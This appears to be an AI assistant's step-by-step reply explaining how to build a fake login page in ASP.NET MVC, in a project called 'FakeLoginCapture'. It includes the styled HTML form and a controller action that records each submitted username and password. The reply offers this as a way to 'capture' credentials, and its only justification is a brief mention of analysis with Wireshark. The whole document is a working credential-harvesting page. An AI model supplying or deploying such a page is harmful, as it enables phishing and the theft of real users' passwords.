Step-by-Step Guide:
1. Set Up the Project in Visual Studio:
Open Visual Studio and create a new project.
Select "ASP.NET Web Application" and click "Next."
Name your project (e.g., "FakeLoginCapture") and choose a location to save it.
Select the "Empty" template and check "MVC" to add necessary folders and core references for MVC.
2. Add the Login Page:
In the Solution Explorer, right-click the "Controllers" folder and add a new controller named HomeController.
Add a new action method in HomeController.cs:
csharp
Copy code
public class HomeController : Controller
{
    public ActionResult Index()
    {
        return View();
    }
}
Right-click the "Views" folder, add a new folder named "Home," and then add a new view named Index.cshtml.
3. Set Up the Login Page View:
Open Index.cshtml and add the following HTML code:
html
Copy code
@{
    ViewBag.Title = "Login";
    Layout = null;  // Not using a layout page for simplicity
}

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>@ViewBag.Title</title>
    <style>
        body {
            background: url('/Content/your-background-image.jpg') no-repeat center center fixed;
            background-size: cover;
            font-family: Arial, sans-serif;
        }
        .login-container {
            width: 300px;
            margin: 100px auto;
            padding: 30px;
            background-color: rgba(255, 255, 255, 0.8);
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.5);
        }
        .login-container h2 {
            text-align: center;
            margin-bottom: 20px;
        }
        .login-container input[type="text"], .login-container input[type="password"] {
            width: 100%;
            padding: 10px;
            margin: 10px 0;
            border: 1px solid #ccc;
            border-radius: 5px;
        }
        .login-container button {
            width: 100%;
            padding: 10px;
            background-color: #007bff;
            color: white;
            border: none;
            border-radius: 5px;
            cursor: pointer;
        }
        .login-container button:hover {
            background-color: #0056b3;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h2>Login</h2>
        <form action="/Home/Login" method="post">
            <input type="text" name="username" placeholder="Username" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Login</button>
        </form>
    </div>
</body>
</html>
Make sure to replace /Content/your-background-image.jpg with the actual path to your background image.
4. Add the Background Image:
Right-click the "Content" folder (or create one if it doesn't exist) and add your background image (e.g., your-background-image.jpg).
5. Handle Form Submission:
In HomeController.cs, add a new action method to handle the form submission:
csharp
Copy code
[HttpPost]
public ActionResult Login(string username, string password)
{
    // Log the username and password to the console (or save to a file)
    System.Diagnostics.Debug.WriteLine($"Username: {username}, Password: {password}");
    
    // Redirect to the Index page after login
    return RedirectToAction("Index");
}
6. Run the Application:
Press F5 to run the application. Your fake login page should now be displayed with the specified background image.
Enter any credentials and submit the form. Check the console output or your logging mechanism to see the captured credentials.
This basic setup should help you capture login attempts for your analysis using Wireshark and other tools. Let me know if you need any more specific details or further customization.
